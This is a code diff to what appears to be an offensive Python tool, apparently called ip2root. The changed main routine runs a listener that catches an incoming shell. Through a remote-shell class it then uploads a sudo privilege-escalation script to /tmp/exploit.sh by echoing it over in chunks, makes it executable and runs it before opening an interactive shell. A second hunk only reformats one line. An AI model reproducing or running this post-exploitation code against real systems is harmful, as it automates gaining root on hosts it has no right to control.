@@ -20,8 +20,11 @@ def main(port, interface):
         sock.listen(hosts)
         shell = Shell(sock, persistent)
         print('[+] Uploading privesc script')
-        shell.sock.upload('/home/blank/ip2root/plugins/privesc/plugin_privesc_sudo.sh', '/tmp/exploit.sh')
-        #sock.send(bytes('id'))
+        rsh = RSH(sock)
+        rsh.upload('./plugins/privesc/plugin_privesc_sudo.sh', '/tmp/exploit.sh')
+        sock.send('chmod +x /tmp/exploit.sh\n')
+        sock.send('cd /tmp\n')
+        sock.send('./exploit.sh\n')
         shell.interact()
         sock.close()
     except KeyboardInterrupt:
@@ -394,7 +397,8 @@ class RSH:
             file = open(localfile, 'r')
             while True:
                 chunk = file.read(1024)
-                if not chunk: break
+                if not chunk: 
+                    break
                 self.sock.send("/bin/echo -en %s >> %s\n" % (repr(chunk), remotefile))
                 self.sock.receive()
             file.close()
